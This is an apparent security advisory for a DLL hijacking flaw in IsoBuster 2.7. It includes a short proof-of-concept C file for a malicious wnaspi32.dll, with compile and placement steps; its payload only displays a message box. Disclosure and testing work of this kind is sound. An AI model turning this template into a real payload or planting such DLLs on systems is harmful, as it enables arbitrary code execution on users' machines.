source: http://www.securityfocus.com/bid/43912/info

IsoBuster is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

IsoBuster 2.7 is vulnerable; other versions may also be affected. 

/*
==================================================================
IsoBuster v2.7 (Build 2.7.0.0) DLL Hijacking Exploit (wnaspi32.dll) 
===================================================================

$ Program: IsoBuster
$ Version: v2.7 (Build 2.7.0.0)
$ Download: http://www.isobuster.com/
$ Date: 2010/10/08
 
Found by Pepelux <pepelux[at]enye-sec.org>
http://www.pepelux.org
eNYe-Sec - www.enye-sec.org

Tested on: Windows XP SP2 && Windows XP SP3

Extensions: " .rar && .r00 ... .r99 && .zoo "

How  to use : 

1> Compile this code as wnaspi32.dll
	gcc -shared -o wnaspi32.dll thiscode.c
2> Move DLL file to the directory where IsoBuster is installed
3> Open any file recognized by isobuster
*/


#include <windows.h>
#define DllExport __declspec (dllexport)
int mes()
{
  MessageBox(0, "DLL Hijacking vulnerable", "Pepelux", MB_OK);
  return 0;
}
BOOL WINAPI  DllMain (
			HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
			{mes();}

